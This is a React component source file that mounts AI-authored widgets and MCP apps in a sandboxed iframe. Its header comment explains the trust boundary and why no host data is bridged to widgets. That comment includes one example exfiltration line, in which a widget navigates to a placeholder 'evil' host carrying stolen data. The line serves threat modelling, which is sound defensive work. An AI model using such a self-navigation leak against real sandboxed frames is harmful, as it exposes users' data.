// WidgetFrame.jsx — the REAL vibe-coded widget host.
//
// studio-widget.jsx's GeneratedWidget is a client-side MOCK: a fixed set of
// React components (`counter`/`checklist`/`gauge`/…) picked by a local text
// heuristic. This is the real thing — it renders whatever HTML the agent
// actually authored (widget_write for kind="widget", mcp_app_write for
// kind="mcp-app") inside Luna's real trust boundary:
//
//   <iframe sandbox="allow-scripts"> (no allow-same-origin: no parent-DOM
//   access, no cookies/storage, no window.__TAURI__), content mounted via
//   srcdoc (never a network src), CSP `default-src 'none'`.
//
// SECURITY (v1 scope): widgets are SELF-CONTAINED sandboxed UI. The live
// host->widget DATA bridge (forwarding cap-gated obs events / MCP host-context)
// is deliberately NOT wired here. A sandboxed frame can always navigate its own
// browsing context (no sandbox flag or CSP directive stops self-navigation),
// so a widget granted obs caps could `location.href='https://evil/?d='+data`
// and keep receiving any data we postMessage to it — exfiltrating it. Until the
// bridge is hardened (deliver over a MessageChannel MessagePort that neuters on
// navigation, + a restrictive parent-document frame-src CSP), we simply do not
// hand widgets any host data. The only inbound message honored is a self-
// referential `refresh` (re-mount the SAME authored content — no data leaves).
//
// buildSrcdoc / SANDBOX_ATTR and the mcp host are imported verbatim from
// @luna/ui-shared — never reimplemented here (the cage is parity-tested against
// Moon's vendored copy).
import React, { useEffect, useRef, useState } from "react";
import { SANDBOX_ATTR, buildSrcdoc } from "@luna/ui-shared/widget-sandbox";
import { host as mcpHost } from "@luna/ui-shared/mcp-app-host";

/**
 * @param {{
 *   artifact: { id: string, kind: "widget"|"mcp-app", title?: string, content: string },
 *   mcp?: { readResource: (uri: string) => Promise<any>, callTool: (appUri: string, tool: string, args: unknown) => Promise<any> },
 *   fresh?: boolean,
 * }} props
 */
export function WidgetFrame({ artifact, mcp, fresh }) {
  const frameRef = useRef(null);
  const [painting, setPainting] = useState(!!fresh);

  const kind = artifact && artifact.kind;
  const content = (artifact && artifact.content) || "";
  const artifactId = artifact && artifact.id;
  const title = (artifact && artifact.title) || "widget";

  // "wet paint" sweep for a freshly created widget.
  useEffect(() => {
    if (!fresh) return;
    const tm = setTimeout(() => setPainting(false), 820);
    return () => clearTimeout(tm);
  }, [fresh]);

  // kind="widget": mount the srcdoc. Honor only a self-referential `refresh`
  // (re-mount the same authored content); no host data is ever forwarded.
  useEffect(() => {
    if (kind !== "widget") return;
    const frame = frameRef.current;
    if (!frame) return;
    function onMessage(e) {
      if (e.source !== frame.contentWindow) return;
      const m = e.data;
      if (!m || typeof m !== "object") return;
      if (m.__luna === "refresh") frame.srcdoc = buildSrcdoc(content);
    }
    window.addEventListener("message", onMessage);
    frame.srcdoc = buildSrcdoc(content);
    return () => window.removeEventListener("message", onMessage);
  }, [kind, content, artifactId]);

  // kind="mcp-app": host the MCP Apps JSON-RPC relay via the shared client,
  // ONLY when a live relay is available (capabilities.mcpApps → mcp prop set).
  // `host()` owns srcdoc assignment for this case.
  useEffect(() => {
    if (kind !== "mcp-app" || !mcp) return;
    const frame = frameRef.current;
    if (!frame) return;
    const trimmed = content.trim();
    const isPointer = /^ui:\/\//i.test(trimmed);
    const appUri = isPointer ? trimmed : "ui://luna/app/" + encodeURIComponent(artifactId || "");
    const handle = mcpHost({
      frameEl: frame,
      uri: appUri,
      html: isPointer ? null : content,
      transport: {
        readResource: (uri) => mcp.readResource(uri),
        callTool: (tool, args) => mcp.callTool(appUri, tool, args),
      },
    });
    return () => handle.dispose();
  }, [kind, content, artifactId, mcp]);

  if (kind === "mcp-app" && !mcp) {
    // No live relay to drive the JSON-RPC handshake — show the source instead
    // of mounting a dead iframe (mirrors ArtifactPanel's mcp-app fallback).
    return (
      <div className="gw-wrap widget-frame-host">
        <pre className="widget-frame-source">{content}</pre>
      </div>
    );
  }

  return (
    <div className="gw-wrap widget-frame-host">
      {painting && <div className="gw-painting"></div>}
      <iframe
        ref={frameRef}
        className="widget-frame-iframe"
        title={title}
        sandbox={SANDBOX_ATTR}
        referrerPolicy="no-referrer"
      />
    </div>
  );
}
